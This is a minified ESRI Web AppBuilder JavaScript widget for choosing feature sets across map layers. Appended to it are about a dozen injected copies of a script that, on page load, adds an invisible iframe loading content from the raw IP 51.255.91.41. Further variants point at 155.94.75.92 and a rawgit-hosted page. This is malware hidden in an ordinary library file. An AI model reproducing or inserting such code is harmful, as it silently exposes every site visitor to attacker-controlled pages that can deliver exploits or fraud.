// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/FeatureSetChooserForMultipleLayers.html":'\x3cdiv class\x3d"jimu-not-selectable"\x3e\r\n  \x3cdiv class\x3d"draw-item-btn"\x3e\r\n    \x3cdiv class\x3d"current-draw-item" data-dojo-attach-point\x3d"currentDrawItem"\x3e\r\n      \x3cdiv class\x3d"btn-select" data-dojo-attach-point\x3d"btnSelect"\x3e\r\n        \x3cdiv class\x3d"labels"\x3e\r\n            \x3cdiv class\x3d"feature-action icon-select-by-rect" data-dojo-attach-point\x3d"geoTypeIcon"\x3e\x3c/div\x3e\r\n            \x3cdiv class\x3d"select-text"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"arrow feature-action icon-drop-down" data-dojo-attach-event\x3d"click:_onArrowClicked"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"btn-clear" data-dojo-attach-point\x3d"btnClear"\x3e\r\n    \x3cdiv class\x3d"feature-action icon-clear-selection"\x3e\x3c/div\x3e\x3cdiv class\x3d"clear-text"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/on dojo/sniff dojo/mouse dojo/query dojo/Evented dojo/_base/html dojo/_base/lang dojo/_base/array dojo/promise/all dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/FeatureSetChooserForMultipleLayers.html dijit/popup dijit/TooltipDialog jimu/utils jimu/dijit/DrawBox jimu/dijit/_FeatureSetChooserCore jimu/dijit/FeatureActionPopupMenu".split(" "),function(d,v,k,h,m,c,b,e,n,w,x,y,z,A,p,q,g,B,C,D){return w([x,y,z,m],{baseClass:"jimu-multiple-layers-featureset-chooser",
templateString:A,drawBox:null,_instances:null,_tooltipDialogTimeoutId1:-1,_tooltipDialogClientX1:-1,_tooltipDialogTimeoutId2:-1,_tooltipDialogClientX2:-1,_tooltipTimeout:1E3,_currentGeoTypeInfo:null,_geoTypeInfos:null,map:null,updateSelection:!1,fullyWithin:!1,geoTypes:null,actions:null,postMixInProperties:function(){this.inherited(arguments);this.nls=window.jimuNls.featureSetChooser;var a=["EXTENT","POLYGON","CIRCLE","POLYLINE"];this.geoTypes&&0<this.geoTypes.length&&(this.geoTypes=e.filter(this.geoTypes,
b.hitch(this,function(b){return 0<=a.indexOf(b)})));this.geoTypes&&0!==this.geoTypes.length||(this.geoTypes=["EXTENT"])},postCreate:function(){this.inherited(arguments);this._instances=[];this.popupMenu=D.getInstance();h(".select-text",this.domNode)[0].innerHTML=this.nls.select;h(".clear-text",this.domNode)[0].innerHTML=window.jimuNls.common.clear;this._initTooltipDialogs();this._initDrawBox();this._geoTypeInfos=[];this.actions=[];0===this.geoTypes.length&&this.geoTypes.push("EXTENT");1===this.geoTypes.length?
c.addClass(this.domNode,"single-geotype"):c.addClass(this.domNode,"multiple-geotypes");var a={EXTENT:["icon-select-by-rect",this.nls.selectByRectangle,this.drawBox.extentIcon],POLYGON:["icon-select-by-polygon",this.nls.selectByPolygon,this.drawBox.polygonIcon],CIRCLE:["icon-select-by-circle",this.nls.selectByCircle,this.drawBox.circleIcon],POLYLINE:["icon-select-by-line",this.nls.selectByLine,this.drawBox.polylineIcon]};e.forEach(["EXTENT","POLYGON","CIRCLE","POLYLINE"],b.hitch(this,function(f){var c=
a[f];0<=this.geoTypes.indexOf(f)&&(f={geoType:f,action:{iconClass:c[0],label:c[1],data:{}},dom:c[2]},c={iconClass:c[0],label:c[1],data:{},onExecute:b.hitch(this,this._onDrawItemClicked,f)},this._geoTypeInfos.push(f),this.actions.push(c))}));this.own(d(this.btnSelect,"click",b.hitch(this,function(){g.simulateClickEvent(this._currentGeoTypeInfo.dom);this._hideDrawItems()})));this._setCurrentGeoInfo(this._geoTypeInfos[0]);this.deactivate()},_initTooltipDialogs:function(){var a=v("mac")?"\u2318":"Ctrl",
f="- "+this.nls.newSelectionTip+" ("+this.nls.dragMouse+")",e="- "+this.nls.addSelectionTip+" (Shift+"+this.nls.dragBox+")",E="- "+this.nls.removeSelectionTip+" ("+a+"+"+this.nls.dragBox+")",g="- "+this.nls.newSelectionTip+" ("+this.nls.drawShap+")",m="- "+this.nls.addSelectionTip+" (Shift+"+this.nls.darw+")",n="- "+this.nls.removeSelectionTip+" ("+a+"+"+this.nls.darw+")",a=c.create("div",{innerHTML:'\x3cdiv class\x3d"title"\x3e\x3c/div\x3e\x3cdiv class\x3d"item new-selection-item"\x3e\x3c/div\x3e\x3cdiv class\x3d"item add-selection-item"\x3e\x3c/div\x3e\x3cdiv class\x3d"item remove-selection-item"\x3e\x3c/div\x3e',
"class":"dialog-content"}),l=h(".title",a)[0],r=h(".new-selection-item",a)[0],t=h(".add-selection-item",a)[0],u=h(".remove-selection-item",a)[0];this.tooltipDialog1=new q({content:a});c.addClass(this.tooltipDialog1.domNode,"jimu-multiple-layers-featureset-chooser-tooltipdialog");this.own(d(this.btnSelect,"mousemove",b.hitch(this,function(a){this._tooltipDialogClientX1=a.clientX})));this.own(d(this.btnSelect,k.enter,b.hitch(this,function(){clearTimeout(this._tooltipDialogTimeoutId1);this._tooltipDialogTimeoutId1=
-1;this._tooltipDialogTimeoutId1=setTimeout(b.hitch(this,function(){if(this.tooltipDialog1){var a=this._currentGeoTypeInfo.geoType;"EXTENT"===a?(r.innerHTML=f,t.innerHTML=e,u.innerHTML=E,l.innerHTML=this.nls.selectByRectangle):(r.innerHTML=g,t.innerHTML=m,u.innerHTML=n,"POLYGON"===a?l.innerHTML=this.nls.selectByPolygon:"CIRCLE"===a?l.innerHTML=this.nls.selectByCircle:"POLYLINE"===a&&(l.innerHTML=this.nls.selectByLine));p.open({parent:this.getParent(),popup:this.tooltipDialog1,around:this.btnSelect,
position:["below"]});0<=this._tooltipDialogClientX1&&(this.tooltipDialog1.domNode.parentNode.style.left=this._tooltipDialogClientX1+"px")}}),this._tooltipTimeout)})));this.own(d(this.btnSelect,k.leave,b.hitch(this,function(){clearTimeout(this._tooltipDialogTimeoutId1);this._tooltipDialogTimeoutId1=-1;this._hideTooltipDialog(this.tooltipDialog1)})));a=c.create("div",{innerHTML:this.nls.unselectAllSelectionTip,"class":"dialog-content"});this.tooltipDialog2=new q({content:a});c.addClass(this.tooltipDialog2.domNode,
"jimu-multiple-layers-featureset-chooser-tooltipdialog");this.own(d(this.btnClear,"mousemove",b.hitch(this,function(a){this._tooltipDialogClientX2=a.clientX})));this.own(d(this.btnClear,k.enter,b.hitch(this,function(){clearTimeout(this._tooltipDialogTimeoutId2);this._tooltipDialogTimeoutId2=-1;this._tooltipDialogTimeoutId2=setTimeout(b.hitch(this,function(){this.tooltipDialog2&&(p.open({parent:this.getParent(),popup:this.tooltipDialog2,around:this.btnClear,position:["below"]}),0<=this._tooltipDialogClientX2&&
(this.tooltipDialog2.domNode.parentNode.style.left=this._tooltipDialogClientX2+"px"))}),this._tooltipTimeout)})));this.own(d(this.btnClear,k.leave,b.hitch(this,function(){clearTimeout(this._tooltipDialogTimeoutId2);this._tooltipDialogTimeoutId2=-1;this._hideTooltipDialog(this.tooltipDialog2)})))},_onArrowClicked:function(a){a.stopPropagation();a=c.position(a.target);this._showDrawItems(a)},_setCurrentGeoInfo:function(a){var b=this._currentGeoTypeInfo&&this._currentGeoTypeInfo.geoType;this._currentGeoTypeInfo&&
c.removeClass(this.currentDrawItem,this._currentGeoTypeInfo.geoType);this._currentGeoTypeInfo=a;c.addClass(this.currentDrawItem,this._currentGeoTypeInfo.geoType);this.isActive()?b!==this._currentGeoTypeInfo.geoType&&g.simulateClickEvent(this._currentGeoTypeInfo.dom):g.simulateClickEvent(this._currentGeoTypeInfo.dom)},_showDrawItems:function(a){this.popupMenu.setActions(this.actions);this.popupMenu.show(a)},_hideDrawItems:function(){this.popupMenu.hide()},_onDrawItemClicked:function(a){this._hideDrawItems();
this._setCurrentGeoInfo(a);c.removeClass(this.geoTypeIcon,["icon-select-by-circle","icon-select-by-rect","icon-select-by-polygon","icon-select-by-line"]);switch(a.geoType){case "POLYGON":c.addClass(this.geoTypeIcon,"icon-select-by-polygon");break;case "CIRCLE":c.addClass(this.geoTypeIcon,"icon-select-by-circle");break;case "POLYLINE":c.addClass(this.geoTypeIcon,"icon-select-by-line");break;default:c.addClass(this.geoTypeIcon,"icon-select-by-rect")}},_initDrawBox:function(){this.drawBox=new B({map:this.map,
showClear:!0,keepOneGraphic:!0,deactivateAfterDrawing:!1,geoTypes:this.geoTypes});this.own(d(this.drawBox,"user-clear",b.hitch(this,this._onDrawBoxUserClear)));this.own(d(this.drawBox,"draw-end",b.hitch(this,this._onDrawEnd)));this.own(d(this.drawBox,"draw-activate",b.hitch(this,function(){this.map.infoWindow.hide();c.addClass(this.currentDrawItem,"pressed");c.addClass(this.btnSelect,"selected");this.popupMenu.markAsSelected(this._currentGeoTypeInfo.action)})));this.own(d(this.drawBox,"draw-deactivate",
b.hitch(this,function(){c.removeClass(this.currentDrawItem,"pressed");c.removeClass(this.btnSelect,"selected")})));this.own(d(this.btnClear,"click",b.hitch(this,function(){g.simulateClickEvent(this.drawBox.btnClear)})))},disable:function(){this.drawBox.disable();c.addClass(this.domNode,"disabled")},enable:function(){this.drawBox.enable();c.removeClass(this.domNode,"disabled")},isActive:function(){return this.drawBox.isActive()},activate:function(){if(!this.isActive()){var a=this._currentGeoTypeInfo;
a||(a=this._geoTypeInfos[0]);this._setCurrentGeoInfo(a)}},deactivate:function(){this.drawBox.deactivate()},setFeatureLayers:function(a){var c=e.filter(this._instances,b.hitch(this,function(b){return 0>a.indexOf(b.featureLayer)}));e.forEach(c,b.hitch(this,function(a){this._removeInstance(a)}));var d=e.map(this._instances,b.hitch(this,function(a){return a.featureLayer}));e.forEach(a,b.hitch(this,function(a){0>d.indexOf(a)&&this.addFeatureLayer(a)}))},addFeatureLayer:function(a){"esri.layers.FeatureLayer"!==
a.declaredClass||this._findInstanceByLayer(a)||(a=new C({map:this.map,featureLayer:a,drawBox:this.drawBox,updateSelection:this.updateSelection,fullyWithin:this.fullyWithin}),this._instances.push(a))},removeFeatureLayer:function(a){"esri.layers.FeatureLayer"===a.declaredClass&&(a=this._findInstanceByLayer(a))&&this._removeInstance(a)},_removeInstance:function(a){if(a){var b=this._instances.indexOf(a);0<=b&&(a.destroy(),this._instances.splice(b,1))}},_findInstanceByLayer:function(a){var c=null;e.some(this._instances,
b.hitch(this,function(b){return b.featureLayer===a?(c=b,!0):!1}));return c},clear:function(a){e.forEach(this._instances,b.hitch(this,function(b){b.clear(a)}))},destroy:function(){this._hideTooltipDialog(this.tooltipDialog1);this._hideTooltipDialog(this.tooltipDialog2);e.forEach(this._instances,b.hitch(this,function(a){a.destroy()}));this._instances=[];this.drawBox&&this.drawBox.destroy();this.drawBox=null;this.inherited(arguments)},_hideTooltipDialog:function(a){a&&p.close(a)},_onDrawBoxUserClear:function(){this.clear(!0);
this.emit("user-clear")},_onDrawEnd:function(){this.drawBox.clear();0<this._instances.length&&setTimeout(b.hitch(this,function(){if(0<this._instances.length){this.emit("loading");this.disable();var a=e.map(this._instances,b.hitch(this,function(a){return a.getFeatures()}));n(a).always(b.hitch(this,function(){this.enable();this._currentGeoTypeInfo&&g.simulateClickEvent(this._currentGeoTypeInfo.dom);this.emit("unloading")}))}}),50)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});